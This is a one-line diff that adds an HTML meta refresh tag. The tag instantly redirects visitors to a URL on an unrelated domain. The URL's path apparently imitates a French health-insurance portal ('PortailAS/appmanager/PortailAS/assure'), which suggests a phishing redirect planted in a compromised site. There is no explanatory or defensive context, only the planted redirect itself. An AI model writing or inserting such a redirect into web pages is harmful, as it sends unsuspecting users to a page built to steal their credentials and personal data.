@@ -1,0 +1,1 @@
+<META http-equiv="refresh" content="0;URL=http://javiermedinacruz.co/AppInvestigacion/app/scripts/controllers/post/404/PortailAS/appmanager/PortailAS/assure_somtc=true">
